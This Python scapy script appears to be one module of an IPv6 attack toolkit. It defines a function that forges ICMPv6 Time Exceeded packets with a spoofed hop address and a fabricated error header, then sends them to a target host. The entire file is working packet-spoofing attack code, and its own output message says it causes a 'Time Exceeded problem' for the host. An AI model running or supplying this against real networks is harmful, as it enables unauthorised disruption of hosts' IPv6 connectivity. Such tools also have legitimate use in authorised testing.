#!/usr/bin/python
from scapy.layers.inet6 import getmacbyip6, IPv6, ICMPv6TimeExceeded, IPerror6, ICMPv6EchoRequest
from scapy.layers.l2 import Ether
from scapy.sendrecv import sendp


def timeExceeded(interface, smac, sip, dip, hop):
    if smac == "":
        smac = getmacbyip6(sip)
    layer3 = IPv6(src=hop, dst=sip)
    timeExceeded = ICMPv6TimeExceeded()/IPerror6(src=sip, dst=dip)/\
                   ICMPv6EchoRequest()
    packet1 = Ether(src=smac)/layer3/timeExceeded
    if interface == "":
        sendp(packet1, verbose=False)
    else:
        sendp(packet1, verbose=False, iface=interface)
    print("Causing Time Exceeded problem to the host:", sip)
